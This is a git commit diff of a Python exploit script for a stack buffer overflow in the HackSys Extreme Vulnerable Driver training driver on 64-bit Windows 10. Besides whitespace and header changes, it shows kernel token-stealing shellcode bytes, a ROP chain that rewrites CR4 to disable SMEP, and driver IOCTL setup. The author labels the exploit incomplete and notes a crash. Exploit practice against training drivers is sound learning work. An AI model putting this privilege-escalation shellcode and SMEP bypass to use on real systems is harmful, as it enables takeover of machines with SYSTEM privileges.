11243a5c5c992dc3b0eccdb3ee9cb35d116a5c2f
cwinfosec <45709553+cwinfosec@users.noreply.github.com>
2023-11-06 00:07:37 -0600

    Update win10_64bit_stackoverflow_SMEP_bypass_incomplete.py

--- HEVD/win10_64bit_stackoverflow_SMEP_bypass_incomplete.py
+++ HEVD/win10_64bit_stackoverflow_SMEP_bypass_incomplete.py
@@ -2,8 +2,8 @@
 Description: Vanilla Buffer Overflow via "TriggerBufferOverflowStack" HEVD 3.00
 Author: Cody Winkler
 Contact: @cwinfosec (twitter)
-Date: 10/6/2023
-Tested On: Microsoft Windows 7 6.1.7601 Service Pack 1 Build 7601 (x86_x64)
+Date: 11/5/2023
+Tested On: Microsoft Windows 10 Enterprise Evaluation 10.0.17763 N/A Build 17763 (x86_x64)
 """
 import aslr
 import ctypes
@@ -20,25 +20,25 @@ kernel32 = ctypes.windll.kernel32
 # CreateFileA function signature
 CreateFileA = kernel32.CreateFileA
 CreateFileA.argtypes = [ctypes.c_char_p,	# lpFileName
-	ctypes.c_uint32,						# dwDesiredAccess
-	ctypes.c_uint32,						# dwShareMode
-	ctypes.c_void_p,						# lpSecurityAttributes
-	ctypes.c_uint32,						# dwCreationDisposition
-	ctypes.c_uint32,						# dwFlagsAndAttributes
-	ctypes.c_void_p]						# hTemplateFile
+	ctypes.c_uint32,			# dwDesiredAccess
+	ctypes.c_uint32,			# dwShareMode
+	ctypes.c_void_p,			# lpSecurityAttributes
+	ctypes.c_uint32,			# dwCreationDisposition
+	ctypes.c_uint32,			# dwFlagsAndAttributes
+	ctypes.c_void_p]			# hTemplateFile
 CreateFileA.restype = ctypes.c_void_p		# The return type
 
 # DeviceIoControl function signature
 DeviceIoControl = kernel32.DeviceIoControl
 DeviceIoControl.argtypes = [
-	ctypes.c_void_p,						# hDevice
-	ctypes.c_ulong,							# dwIoControlCode
-	ctypes.c_void_p,						# lpInBuffer
-	ctypes.c_ulong,							# nInBufferSize
-	ctypes.c_void_p,						# lpOutBuffer
-	ctypes.c_ulong,							# nOutBufferSize
-	ctypes.POINTER(ctypes.c_ulong),			# lpBytesReturned
-	ctypes.c_void_p]						# lpOverlapped
+	ctypes.c_void_p,			# hDevice
+	ctypes.c_ulong,				# dwIoControlCode
+	ctypes.c_void_p,			# lpInBuffer
+	ctypes.c_ulong,				# nInBufferSize
+	ctypes.c_void_p,			# lpOutBuffer
+	ctypes.c_ulong,				# nOutBufferSize
+	ctypes.POINTER(ctypes.c_ulong),		# lpBytesReturned
+	ctypes.c_void_p]			# lpOverlapped
 DeviceIoControl.restype = ctypes.c_int
 
 def msf_fuzz():
@@ -64,11 +64,11 @@ def craft_shellcode():
 	# Shellcode to run
 
 	shellcode = b""
-	shellcode += b"\xcc"*8							# debugger interrupt - we land here
-	shellcode += b"\x90"*8							# padding - but get SMEP BSOD as soon as we hit NOP padding???
+	shellcode += b"\xcc"*8				# debugger interrupt - we land here
+	shellcode += b"\x90"*8				# padding - but get SMEP BSOD as soon as we hit NOP padding???
 	shellcode += b"\x48\x31\xc0"                	# xor    rax,rax
 	shellcode += b"\x65\x48\x8b\x80\x88\x01\x00"    # mov    rax,QWORD PTR gs:[rax+0x188]
-	shellcode += b"\x00"							# align
+	shellcode += b"\x00"				# align
 	shellcode += b"\x48\x8b\x80\xb8\x00\x00\x00"    # mov    rax,QWORD PTR [rax+0xb8]
 	shellcode += b"\x48\x89\xc1"                	# mov    rcx,rax
 	shellcode += b"\x49\x89\xcb"                	# mov    r11,rcx
@@ -77,15 +77,15 @@ def craft_shellcode():
 	shellcode += b"\x48\x8b\x80\xe8\x02\x00\x00"    # mov    rax,QWORD PTR [rax+0x2e8]
 	shellcode += b"\x48\x2d\xe8\x02\x00\x00"       	# sub    rax,0x2e8
 	shellcode += b"\x48\x39\x90\xe0\x02\x00\x00"    # cmp    QWORD PTR [rax+0x2e0],rdx
-	shellcode += b"\x75\xea"                   		# jne    21 <.text+0x21>
+	shellcode += b"\x75\xea"                   	# jne    21 <.text+0x21>
 	shellcode += b"\x48\x8b\x90\x58\x03\x00\x00"    # mov    rdx,QWORD PTR [rax+0x358]
 	shellcode += b"\x48\x83\xe2\xf0"             	# and    rdx,0xfffffffffffffff0
 	shellcode += b"\x4c\x09\xda"                	# or     rdx,r11
 	shellcode += b"\x48\x89\x91\x58\x03\x00\x00"    # mov    QWORD PTR [rcx+0x358],rdx
 
 	restore_kernel = b""
-	restore_kernel += b"\x48\x83\xc4\x28"             	#add    rsp,0x28
-	restore_kernel += b"\xc3"                      		#ret
+	restore_kernel += b"\x48\x83\xc4\x28"           #add    rsp,0x28
+	restore_kernel += b"\xc3"                      	#ret
 
 	return shellcode + restore_kernel
 
@@ -107,11 +107,11 @@ def craft_buffer_payload():
 	#	ROP CHAIN
 	###
 	rop_chain = struct.pack("<Q", kernel_base_addr + 0x066bae)	# pop rcx, ret;
-	rop_chain += struct.pack("<Q", 0x70678)						# flip SMEP bip
-	rop_chain += struct.pack("<Q", kernel_base_addr + 0x292ee9) # mov cr4, rcx; ret;
+	rop_chain += struct.pack("<Q", 0x70678)				# flip SMEP bip
+	rop_chain += struct.pack("<Q", kernel_base_addr + 0x292ee9) 	# mov cr4, rcx; ret;
 	rop_chain += dep_bypass
 
-	#buffer_payload = create_string_buffer(offset)							# Fuzz
+	#buffer_payload = create_string_buffer(offset)			# Fuzz
 	buffer_payload = create_string_buffer(offset + rop_chain)	# Exploit
 
 	return buffer_payload
@@ -146,10 +146,10 @@ def get_driver_handle():
 	print("[+] Opening handle on driver object")
 	driver_handle = CreateFileA(b"\\\\.\\HackSysExtremeVulnerableDriver",  # lpFileName
 		0xC0000000,		# GENERIC_ALL
-		0,				# FILE_SHARE_READ
+		0,			# FILE_SHARE_READ
 		None,			# lpSecurityAttributes
 		0x3,			# OPEN_EXISTING
-		0,				# FILE_ATTRIBUTE_NORMAL
+		0,			# FILE_ATTRIBUTE_NORMAL
 		None)			# hTemplateFile
 
 	return driver_handle
